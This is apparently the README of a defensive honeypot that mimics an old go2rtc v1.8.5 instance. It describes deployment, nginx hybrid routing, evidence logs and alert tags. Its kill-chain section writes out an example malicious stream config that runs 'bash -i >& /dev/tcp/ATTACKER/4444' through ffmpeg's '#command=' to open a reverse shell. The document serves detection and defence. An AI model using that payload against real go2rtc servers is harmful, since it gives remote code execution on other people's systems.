# 🍯 好甜的蜜罐 · hǎo tián de mì guàn

[![CI](https://github.com/jsserve-org/haotian-miguan/actions/workflows/ci.yml/badge.svg)](https://github.com/jsserve-org/haotian-miguan/actions/workflows/ci.yml)
[![Docker](https://github.com/jsserve-org/haotian-miguan/actions/workflows/docker.yml/badge.svg)](https://github.com/jsserve-org/haotian-miguan/actions/workflows/docker.yml)

**"Such a sweet honeypot."** A deception honeypot that impersonates an old,
unpatched **go2rtc v1.8.5** instance — built to catch attackers who find
"your go2rtc" and try to compromise it by **applying a malicious config
file**.

go2rtc deployments get mass-scanned because the classic kill chain is easy:

1. `GET /api` → fingerprints an old version
2. `GET /api/streams` → leaks camera RTSP URLs **with credentials** (v1.8.5
   had no credential masking)
3. `GET /api/config` → leaks the whole `go2rtc.yaml`, including API auth
4. `POST /api/config` (or `PUT /api/streams`, or the web **Config → Save &
   Restart** editor) → plants a stream like:

   ```yaml
   streams:
     pwn: ffmpeg:rtsp://127.0.0.1/test#command=bash -i >& /dev/tcp/ATTACKER/4444 0>&1
   ```

5. views the stream once → the real go2rtc happily executes the attacker's
   `#command=` in ffmpeg → **RCE**

好甜的蜜罐 performs the whole role of step 1–5's *victim*, except nothing is
ever executed. Every "applied" config is mirrored into a fake state, echoed
back byte-for-byte, listed in `/api/streams` after the "restart", and even
mentioned in the fake `/api/log` — so the attacker believes the exploit
landed and keeps talking to the pot while you collect evidence.

---

## What it impersonates (modeled from the real v1.8.5 source)

The responses are not "inspired by" go2rtc — they mirror the actual
handlers of the [`v1.8.5` tag](https://github.com/AlexxIT/go2rtc/tree/v1.8.5):

| Piece | Behavior |
|---|---|
| `GET /api` | `{"version":"1.8.5","host":…,"rtsp":{"listen":":8554","default_query":"video&audio"},"config_path":"/config/go2rtc.yaml"}` — Go-style JSON (sorted keys, trailing newline, `application/json`) |
| Old WebUI | The white-table UI of that era: `index.html` stream table, `add.html`, `links.html`, `log.html`, and the ACE-based `editor.html` (**Save & Restart** posts your attacker's YAML straight into the trap) |
| `GET /api/streams` | `{"name":{"producers":[{"url":"rtsp://admin:pass@…"}],"consumers":null}}` — credentials leak exactly like the real pre-masking version |
| `GET /api/config` | The juicy `go2rtc.yaml` with 5 fake cameras, commented-out auth, `application/yaml` |
| `POST /api/config` | **The trap.** Full raw YAML like the real `configHandler` → validates, "writes", returns `200` with an **empty body**; invalid YAML → `500` with a yaml error; a later `GET` echoes the attacker's payload byte-for-byte |
| `PATCH /api/config` | Merges like the real `mergeYAML` |
| `PUT/PATCH/DELETE /api/streams` | Faithful quirks: PUT rejects sources containing spaces (`streams.New` sanitize), PATCH requires `name` and a registered scheme, DELETE also patches the config file |
| `POST /api/restart` | Runtime "re-reads" the config — the attacker's planted streams appear (in real v1.8.5 a config POST needs a restart to take effect — mirrored) |
| `POST /api/exit?code=N` | `400 Code must be in the range [0, 125]` for bad codes; valid codes drop the TCP connection like a killed process — while the pot keeps living |
| WebRTC signaling | Sync `POST /api/webrtc?src=`: JSON offer→answer, WHEP `201`+`application/sdp`, raw SDP, the faithful *silent 200* for unknown sources, WHIP `?dst=` with `Location: webrtc?id=` |
| Media | `frame.jpeg` serves a fake night-cam JPEG, `stream.mjpeg` actually streams multipart frames at 1 fps (the "camera" looks alive in a browser), `stream.m3u8` playlist, `stream.mp4`/`frame.mp4` stall like offline cameras |
| `/api/log` | Synthesized zerolog-style JSON lines (`application/jsonlines`), including `[streams] start producer url=…` for attacker-planted ffmpeg streams |
| RTSP `:8554` | OPTIONS/DESCRIBE/SETUP/PLAY with `s=go2rtc/1.8.5` SDP — nmap fingerprints it as a real RTSP go2rtc |
| Go net/http flavor | No `Server` header, `Date` headers, `404 page not found` bodies, `nosniff` error responses, keep-alive — nothing screams "Python" |

## Evidence layout (`--data-dir`, default `./data`)

| File | Contents |
|---|---|
| `access.jsonl` | every HTTP **and** RTSP request (IP, UA, headers, path, body preview, timing) |
| `alerts.jsonl` | suspicious events with **full payloads** + classification tags |
| `alerts.log` | one-line plain format (`severity=high ip=1.2.3.4 tags=config_write,ffmpeg_rce …`) for fail2ban |
| `drops/` | raw attacker payloads, one file per alert, extension by content sniff |
| `state.json` | the fake "on-disk go2rtc.yaml" the attacker has been shaping (+ which streams they planted) |
| `memlog.jsonl` | fake go2rtc memory log (what `/api/log` serves) |

Alert tags: `config_read` (recon) · `config_write` (the trap hit) ·
`stream_write` · `ffmpeg_rce` (`#command=` / `#input=` payload) ·
`exec_pattern` (shell/reverse-shell) · `template_inject` (`{input}`) ·
`restart_attempt` · `exit_attempt` · `planted_view` (consuming a stream
they planted — the RCE trigger moment) · `traversal` · `oversized` ·
`share`/`publish` (webtorrent/rtmp abuse).

---

## Quick start

**From GitHub Packages (multi-arch image, built by CI):**

```bash
docker pull ghcr.io/jsserve-org/haotian-miguan:latest
docker run -d --name haotian-miguan \
  -p 1984:1984 -p 8554:8554 \
  -v haotian_data:/data \
  ghcr.io/jsserve-org/haotian-miguan:latest
docker logs -f haotian-miguan        # watch the pot fill up
```

Every `main` push publishes `latest` + `sha-<commit>`; `v*` tags publish
versioned images. If your org keeps packages private, `docker login ghcr.io`
first with a PAT that has `read:packages`.

**Bare metal (Python ≥ 3.9, zero dependencies):**

```bash
python3 honeypot.py                      # HTTP :1984 + RTSP :8554, logs to ./data
python3 honeypot.py --webhook https://discord.com/api/webhooks/…   # alert push
```

**Docker Compose (image from GitHub Packages, hardened: read-only fs, no caps, non-root):**

```bash
docker compose up -d                    # pulls ghcr.io/jsserve-org/haotian-miguan:latest
docker compose logs -f                  # watch the pot fill up
```

Variants:

- `docker-compose.proxy.yml` — run it **behind your own nginx** (shifted host
  ports `19840`/`18554`, HTTP bound to the docker bridge IP only, and
  `--trust-proxy` so evidence records the attacker's real IP)
- `docker-compose.hybrid.yml` — **be the dangerous half of your REAL
  go2rtc**: same public hostname, viewers hit the real instance, attackers
  hit the pot (see below)
- `docker-compose.build.yml` — build from source instead of pulling GHCR

**Verify the illusion** (safe — it's all fake):

```bash
./smoke_test.sh                         # 23 fidelity checks
curl -s http://127.0.0.1:1984/api       # {"version": "1.8.5", …}
```

**See who you caught:**

```bash
python3 report.py                       # pretty catch report
python3 dashboard.py                    # live web page → http://127.0.0.1:8080
python3 report.py --json                # for shipping elsewhere
```

The **dashboard** is the easiest way to read the catch: it shows *Configs
attackers tried to apply* — each payload exactly as it was sent, escaped
and never executed — plus the streams they planted, the alerts feed, and
tag/IP counters. It serves plain HTML (auto-refresh, pause link), a
`data.json` endpoint, and links to the raw evidence drops.

It is **independent of the deployment mode** — direct, proxy or hybrid —
because it only reads the evidence directory. Every image-based compose
file ships it as an opt-in `dashboard` service on `127.0.0.1:8080`; for
anything else, run it against the same volume:

```bash
# reuse the pot's volumes (no volume-name guessing):
docker run --rm -p 127.0.0.1:8080:8080 --volumes-from haotian-miguan \
  ghcr.io/jsserve-org/haotian-miguan:latest \
  python3 dashboard.py --data-dir /data --host 0.0.0.0 --port 8080

# or on bare metal, pointed at the evidence dir:
python3 dashboard.py --data-dir ./data
```

It has no authentication by design and binds to localhost — for remote
viewing use an SSH tunnel (`ssh -L 8080:127.0.0.1:8080 your-host`) or put
auth in front.

### Options

```
--host 0.0.0.0          bind address                --rtsp-port 8554   0 disables RTSP
--port 1984             fake go2rtc API port        --webhook URL      POST alerts (Discord/Slack/relay)
--data-dir ./data       evidence + state dir       --webhook-format   auto|discord|slack|generic
--max-body-mb 8         request body cap           --version-string 1.8.5   version to advertise
--config-path-label /config/go2rtc.yaml            --config-file FILE   seed the fake go2rtc.yaml
--reset                 wipe fake state            --trust-proxy        evidence IP from X-Real-IP
--quiet                 only alerts on console     --no-color           plain console
```

Webhook format is auto-detected from the URL (Discord webhooks and Slack
incoming webhooks get native embeds/attachments with the attacker's payload
in a code block; anything else receives the raw alert record as JSON for
your own automation). `alerts.log` carries the same payload, one escaped
line, for `tail -f` and fail2ban.

### Hybrid mode: your REAL go2rtc with the fangs swapped

The strongest deployment doesn't advertise a separate decoy at all — the
public hostname **is** your real instance, but everything an attacker touches
is secretly the pot. Viewers watch real cameras; anyone who opens
`/editor.html`, reads or applies `/api/config`, plants a stream, or pokes
`/api/exit` lands in the honeypot with a fully consistent illusion:

- the pot **auto-seeds** its fake `go2rtc.yaml` from the real instance's
  stream list — same stream names, but credentials are replaced, so
  attackers can never harvest your real camera passwords from the "leak"
- the fake `/api/log` adopts the **real version string**, so nothing
  contradicts the live `/api` response
- `/api/streams` is a **live merge**: real streams (creds scrubbed) plus
  whatever the attacker planted after their fake "restart", minus whatever
  they "deleted" (their deletes never touch the real instance)
- viewing a planted stream serves the fake camera frame — the exact moment
  a real go2rtc would execute their `ffmpeg:…#command=` — while real
  streams never leave the real instance (nginx gives the pot only the
  media requests that the real instance 404s)
- `/api/exit` kills only the illusion (the connection drops), never your
  real process — which is a fix, because an unpatched real go2rtc can be
  exited remotely by anyone

Run it:

```bash
docker compose -f docker-compose.hybrid.yml up -d
```

(the pot talks to the real instance at `http://172.17.0.1:1984`, binds
HTTP to the docker bridge only, keeps `--trust-proxy` on, and leaves RTSP
to the real instance)

And route your existing go2rtc vhost like this — note what is *deliberately
missing* compared to a hardened vhost: no `no thank you` blocks, no
`/editor.html` redirect. On the decoy surface the trap must stay open:

```nginx
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}

server {
    listen 80;

    # attacker payloads must reach the pot (nginx default is 1m)
    client_max_body_size 16m;

    # ---- the honeypot half: control + config (serves users nothing) ----
    location ~ ^/api/(config|restart|exit|log|streams|webrtc)$ {
        proxy_pass http://172.17.0.1:19840;          # the pot
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;                     # evidence IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
    }

    # ---- media: YOUR VIEWERS go straight to the real instance. The pot
    #      answers only what the real instance rejects — its 404 means
    #      "a stream I've never heard of", i.e. something an attacker
    #      planted. Users never touch the pot on this path. ----
    location ~ ^/api/(frame\.jpeg|stream\.mjpeg|stream\.mp4|frame\.mp4|stream\.m3u8|segment\.ts)$ {
        proxy_pass http://172.17.0.1:1984;           # real go2rtc first
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
        proxy_intercept_errors on;
        error_page 404 = @potmedia;                  # unknown stream → the pot
    }

    location @potmedia {
        proxy_pass http://172.17.0.1:19840;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
    }

    # the old-UI pages that are pure attack surface on a real instance
    location ~ ^/(editor|add|log)\.html$ {
        proxy_pass http://172.17.0.1:19840;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # ---- the viewer half: the REAL go2rtc ----
    location / {
        proxy_pass http://172.17.0.1:1984;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
    }
}
```

Who sees what (endpoint names are go2rtc's own — note `.mjpeg`, not
`.mjpg`; go2rtc has never had a `.mjpg` route):

| Request | Served by | Result |
|---|---|---|
| `/`, UI pages, `/api`, `/api/ws` | real go2rtc, direct | your UI and live WebUI playback exactly as today |
| `GET /api/streams` | pot | merged: real streams (creds scrubbed) + planted |
| `GET /api/config` | pot | juicy fake config, real stream names, fake passwords |
| `POST /api/config` + `/api/restart` | pot | "applied"; their stream appears, logs say so |
| `PUT/PATCH/DELETE /api/streams` | pot | planting logged; real config untouched |
| media (`frame.jpeg`, `stream.mjpeg`, `stream.mp4`, `frame.mp4`, `stream.m3u8`, `segment.ts`) for a REAL stream | real go2rtc, direct | your viewers never touch the pot |
| media for a stream the real instance doesn't know (attacker-planted) | real says 404 → nginx intercepts → pot | fake frame/MJPEG — the RCE trigger moment (high alert) |
| `/api/webrtc` for a REAL stream | pot → relayed upstream | legacy sync signaling only; relayed untouched |
| `/api/webrtc` for a PLANTED stream | pot | pot's answer SDP (real go2rtc would go silent-200) |
| `/api/log`, `/api/exit` | pot | fake logs; exit kills the connection, not the process |

Why is media **not** pot-first? Because your viewers actually use it:
`stream.mjpeg` on a wall display, `frame.jpeg` snapshots, HLS on phones.
Their streams must never depend on the honeypot. go2rtc answers
`404 stream not found` for any stream it doesn't know (verified against
the v1.8.5 media handlers: `frame.jpeg`, `stream.mjpeg`, `stream.mp4`,
`frame.mp4`, `stream.m3u8` all do) — so nginx sends media to the real
instance and lets **its 404 be the attacker detector**:
`error_page 404 = @potmedia` hands exactly those requests to the pot. A
viewer watching `front_door` goes straight to the real instance — no
extra hop, no extra failure domain; an attacker asking for the `rev_shell`
they just planted gets the pot's fake frame because the real instance has
never heard of that stream. If the pot is down, viewers notice nothing at
all — only requests for streams that don't exist on the real instance
would see a 502 instead of a 404.

Two honest edges of the fallback:

- if an attacker plants a stream under a name that **already exists** on
  the real instance, their media requests get the real camera (200, so no
  fallback). The classic exploit plants a fresh name, which is fully
  covered; the overwrite case shows the real video instead of the fake
  frame. The planted config still shows up in `/api/streams` and
  `/api/config`, and the write itself is alerted.
- Chrome requests `frame.mp4` twice (once without `Range`, once with);
  the Range-less probe gets the real instance's empty 200, the real
  request falls through to the pot as described.

`/api/ws` is deliberately in neither block: it is what the real WebUI and
the Home Assistant card actually play through, so it stays direct on the
real instance.

Notes:

- Your REAL instance should keep `api.listen` private (LAN/localhost) —
  nginx is its only public path; the pot is the only thing that answers
  the dangerous endpoints.
- Auto-seed runs at boot (and retries once a minute if the real instance
  was restarting). Added cameras? Pull your evidence, then reseed:
  `docker exec haotian-miguan rm /data/state.json && docker restart haotian-miguan`
- A `planted_view` alert (severity: high) fires the moment someone
  consumes a stream they planted — on a real go2rtc that is the instant
  their reverse shell would have spawned. That is your paging-worthy
  signal.

## Behind your reverse proxy (nginx)

If traffic reaches the pot through **your own nginx** (e.g. the classic
`proxy_pass http://172.17.0.1:1984` setup), two things change:

1. Use `docker-compose.proxy.yml` — it binds HTTP to the docker bridge IP
   only (`172.17.0.1:19840`) and adds `--trust-proxy`, so evidence, alerts
   and fail2ban see the attacker's real IP from `X-Real-IP` instead of
   your proxy's address (the direct peer is kept in the `peer` field).
2. **Do not copy the protection blocks from your real instance's vhost.**
   On a hardened go2rtc you block `/api/config`, `/api/restart` and
   redirect `/editor.html` away — on the *decoy* those endpoints are the
   entire point and must stay reachable:

```nginx
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}

server {
    # optional: also catch bare-IP / unmatched-Host scanners — but only
    # one server may be default per listen port; give your REAL vhost an
    # explicit server_name if you promote this one to default.
    listen 80;                      # or: listen 80 default_server;
    server_name cam.example.com;    # the decoy's hostname

    client_max_body_size 16m;       # let beefy malicious configs reach the pot

    location / {
        proxy_pass http://172.17.0.1:19840;
        proxy_http_version 1.1;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;                     # evidence IP
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket support (the decoy has none — harmless, keeps parity
        # with your real vhost's fingerprint)
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;

        # Streaming (the fake MJPEG actually streams)
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;
        proxy_cache off;
    }

    # NOTE: deliberately NO `location = /api/config { return 200 "no thank you"; }`
    # and NO /editor.html redirects here. The trap must stay open.
}
```

Notes:

- nginx's `http` block cannot proxy RTSP. The compose variant publishes
  RTSP directly on host port `18554` (scanners still find it); switch to
  `8554:8554` if the classic port is free. A `stream {}` TCP passthrough
  is possible but usually not worth it for a decoy.
- With `--trust-proxy` on, don't leave the pot's HTTP port directly
  internet-reachable (a direct hit could forge `X-Real-IP`); the proxy
  compose binds it to `172.17.0.1` only for exactly that reason.
- fail2ban still works: `alerts.log` carries the attacker's real IP, so
  bans hit the source, not your proxy.

### Deploying it for real

- Run the honeypot where the internet can see it on the standard ports
  (`:1984` HTTP, `:8554` RTSP) — a cheap VPS or a DMZ host is ideal.
  **Don't run it on the same host:port as your real go2rtc.**
- Move your *real* go2rtc off the WAN (bind `api.listen: 127.0.0.1:1984`,
  VPN, reverse proxy with auth). The honeypot takes over the public
  "go2rtc-shaped" surface; anything that knocks on it is up to no good.
- Tune the bait: edit `DEFAULT_CONFIG` in `honeypot.py` (or pass
  `--config-file your-go2rtc.yaml`) so the fake instance matches the
  cameras/streams of your real deployment.
- Ship alerts: `--webhook` to Discord/Slack/generic relay; or wire
  `alerts.log` to fail2ban with `extras/fail2ban/` for auto-bans.
- Rotate the evidence dir (the JSONL files grow unbounded — logrotate is fine).

## Safety guarantees

- **Nothing an attacker sends is ever executed, imported, or rendered** —
  payloads are stored as inert text under `--data-dir` only.
- No outbound connections except your optional `--webhook`.
- Body size cap, per-connection timeouts (slowloris guard), request
  backlog; RTSP/HTTP are pure parsers that never touch the filesystem.
- The "credentials" in the fake config are invented. Never put real camera
  or API passwords into the bait.
- The pot survives "restarts" and "exits" — only its illusion of death dies.

## Limitations (honest fingerprint deltas)

A very patient attacker could notice: WebRTC answers never complete ICE
(the "camera is offline" story), MP4/HLS playback stalls, `stream.html`
uses a simplified player module, `/api/ws` (WebSocket transport) is absent,
and JSON escaping follows Python rather than Go's `<`/`>` escaping. For the
mass-scanner / config-applier crowd this pot is indistinguishable; a
targeted APT doing byte-level diffs against a genuine 1.8.5 could tell.

## Legal & ethics

This is a passive, defensive deception system: it observes and records
attempts against *your* infrastructure. Do not attack back, do not feed
malicious-looking payloads into real systems, and check local law before
deploying honeypots on public IPs. Log data can contain forged IPs —
verify before escalating.

## Files

```
honeypot.py   the whole honeypot (stdlib only, single-file deploy)
dashboard.py  live catch dashboard — shows the configs attackers tried to apply
report.py     catch report / summary tool
smoke_test.sh 23-point fidelity + trap verification suite
Dockerfile, docker-compose.yml, docker-compose.proxy.yml,
            docker-compose.hybrid.yml, docker-compose.build.yml, .dockerignore
.github/workflows/    CI (fidelity, trust-proxy, hybrid seam, dashboard, webhooks)
                      + multi-arch build → GH Packages
extras/nginx/     the full hybrid vhost (go2rtc-hybrid.conf)
extras/fail2ban/  filter + jail for auto-banning caught IPs
extras/tests/     webhook capture + assertions used by CI
assets/camera_frame.jpg   the fake night-cam frame (embedded at build time)
```

---

*Be sweet, be sticky.* 🍯
